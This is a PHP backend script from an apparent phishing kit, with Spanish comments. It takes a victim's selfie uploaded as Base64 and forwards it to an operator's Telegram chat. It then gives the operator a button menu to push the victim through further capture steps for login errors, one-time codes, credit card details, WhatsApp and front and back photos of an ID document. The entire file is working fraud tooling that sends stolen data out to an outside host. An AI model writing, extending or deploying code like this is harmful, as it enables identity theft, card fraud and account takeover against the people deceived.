<?php
// modules/api/procesar_selfie.php
// Procesar imagen Base64 y enviar a Telegram

$config = require '../../config/config.php';
$botToken = $config['botToken'];
$chatId = $config['chatId'];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['selfie'])) {

    $cliente_id = $_POST['cliente_id'] ?? 'Desconocido';
    $dataUrl = $_POST['selfie'];

    // Extraer base64
    // formato: "data:image/jpeg;base64,/9j/4AAQSw..."
    if (preg_match('/^data:image\/(\w+);base64,/', $dataUrl, $type)) {
        $encoded_string = substr($dataUrl, strpos($dataUrl, ',') + 1);
        $type = strtolower($type[1]); // jpg, png, gif

        $decoded_file = base64_decode($encoded_string);

        // Guardar temporalmente
        $tempFile = tempnam(sys_get_temp_dir(), 'selfie_') . '.' . $type;
        file_put_contents($tempFile, $decoded_file);

        // Enviar a Telegram
        $url = "https://api.telegram.org/bot$botToken/sendPhoto";

        $post_fields = [
            'chat_id' => $chatId,
            'photo' => new CURLFile($tempFile),
            'caption' => "📸 *Nueva Selfie Recibida*\n🆔 Cliente: `$cliente_id`",
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "Content-Type:multipart/form-data"
        ));
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        $output = curl_exec($ch);
        curl_close($ch);

        // Enviar Menú de Acciones al Admin
        $baseUrl = $config['baseUrl'];
        $security_key = $config['security_key'];

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '❌ Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
                    ['text' => '🔑 Otp', 'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key"],
                ],
                [
                    ['text' => '⚠️ Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"],
                    ['text' => '💳 CC', 'url' => "$baseUrl?id=$cliente_id&estado=5&key=$security_key"],
                ],
                [
                    ['text' => '⚠️ CC Error', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"],
                    ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=7&key=$security_key"],
                ],
                [
                    ['text' => '📲 WhatsApp', 'url' => "$baseUrl?id=$cliente_id&estado=8&key=$security_key"],
                    ['text' => '🤳 Selfie', 'url' => "$baseUrl?id=$cliente_id&estado=9&key=$security_key"],
                    ['text' => '⚠️ Selfie Error', 'url' => "$baseUrl?id=$cliente_id&estado=10&key=$security_key"]
                ],
                [
                    ['text' => '🆔 Doc Frente', 'url' => "$baseUrl?id=$cliente_id&estado=11&key=$security_key"],
                    ['text' => '🆔 Doc Reverso', 'url' => "$baseUrl?id=$cliente_id&estado=12&key=$security_key"]
                ]
            ]
        ];

        $urlMsg = "https://api.telegram.org/bot$botToken/sendMessage";
        $post_fields_msg = [
            'chat_id' => $chatId,
            'text' => "📸 Selfie recibida de Cliente: `$cliente_id`. ¿Qué acción tomar?",
            'parse_mode' => 'Markdown',
            'reply_markup' => json_encode($keyboard)
        ];

        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
        curl_setopt($ch2, CURLOPT_URL, $urlMsg);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_POSTFIELDS, $post_fields_msg);
        curl_exec($ch2);
        curl_close($ch2);

        // Borrar temp
        unlink($tempFile);

        // Responder OK
        http_response_code(200);
        echo json_encode(['status' => 'ok']);
    } else {
        http_response_code(400);
        echo json_encode(['error' => 'Formato de imagen inválido']);
    }

} else {
    http_response_code(400);
    echo json_encode(['error' => 'No data']);
}
?>